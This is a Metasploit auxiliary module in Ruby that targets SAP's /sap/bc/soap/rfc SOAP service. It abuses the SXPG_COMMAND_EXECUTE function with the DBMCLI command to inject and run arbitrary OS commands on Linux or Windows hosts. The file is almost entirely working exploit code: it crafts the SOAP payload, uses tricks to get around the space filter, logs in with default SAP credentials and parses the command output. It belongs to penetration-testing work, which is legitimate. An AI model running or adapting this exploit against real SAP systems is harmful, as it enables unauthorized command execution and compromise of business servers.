##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection',
			'Description' => %q{
					This module makes use of the SXPG_COMMAND_EXEC Remote Function Call, through the
				use of the /sap/bc/soap/rfc SOAP service, to inject and execute OS commands.
			},
			'References' =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ],
					[ 'URL', 'http://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection' ]
				],
			'Author' =>
				[
					'nmonkee'
				],
			'License' => MSF_LICENSE
			)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [true, 'SAP Client', '001']),
				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
				OptString.new('PASSWORD', [true, 'Password', '06071992']),
				OptEnum.new('OS', [true, 'Target OS', "linux", ['linux','windows']]),
				OptString.new('CMD', [true, 'Command to run', "id"])
			], self.class)
	end

	def run_host(ip)
		payload = create_payload(1)
		exec_command(ip,payload)
		payload = create_payload(2)
		exec_command(ip,payload)
	end

	def create_payload(num)
		command = ""
		os = "ANYOS"
		if datastore['OS'].downcase == "linux"
			if num == 1
				command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
				command << datastore['CMD'].gsub(" ","\t")
				command << "\n"
			end
			command = "-ic /tmp/pwned.txt" if num == 2
		elsif datastore['OS'].downcase == "windows"
			if num == 1
				command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
				space = "%programfiles:~10,1%"
				command << datastore['CMD'].gsub(" ",space)
			end
			command = '-ic c:\\\pwn.out' if num == 2
		end
		data = '<?xml version="1.0" encoding="utf-8" ?>' + "\r\n"
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">' + "\r\n"
		data << '<env:Body>' + "\r\n"
		data << '<n1:SXPG_COMMAND_EXECUTE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">' + "\r\n"
		data << '<ADDITIONAL_PARAMETERS>' + command + ' </ADDITIONAL_PARAMETERS>' + "\r\n"
		data << '<COMMANDNAME>DBMCLI</COMMANDNAME>' + "\r\n"
		data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>' + "\r\n"
		data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>' + "\r\n"
		data << '</n1:SXPG_COMMAND_EXECUTE>' + "\r\n"
		data << '</env:Body>' + "\r\n"
		data << '</env:Envelope>' + "\r\n"
		return data
	end

	def exec_command(ip,data)
		print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
		begin
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'headers' =>{
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				}
			})
			if res
				if res.code != 500 and res.code != 200
					print_error("[SAP] #{ip}:#{rport} - something went wrong!")
					return
				elsif res.body =~ /faultstring/
					error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
					0.upto(error.length-1) do |i|
						print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
					end
					return
				end
				print_status("[SAP] #{ip}:#{rport} - got response")
				output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
				result = []
				0.upto(output.length-1) do |i|
					if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \(/
					#nothing
					elsif output[i] =~ /unknown host/ || output[i] =~ /; \(see/ || output[i] =~ /returned with/
					#nothing
					elsif output[i] =~ /External program terminated with exit code/
					#nothing
					else
						temp = output[i].gsub("&#62",">")
						temp_ = temp.gsub("&#34","\"")
						temp__ = temp_.gsub("&#39","'")
						result << temp__ + "\n"
					end
				end
				saptbl = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header'  => "[SAP] SXPG_COMMAND_EXEC dbmcli Command Injection",
					'Prefix'  => "\n",
					'Postfix' => "\n",
					'Indent'  => 1,
					'Columns' =>["Output"]
					)
				0.upto(result.length/2-1) do |i|
					saptbl << [result[i].chomp]
				end
				print (saptbl.to_s)
				return
			else
				print_error("[SAP] #{ip}:#{rport} - no response")
			end
		rescue ::Rex::ConnectionError
			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
			return
		end
	end
end
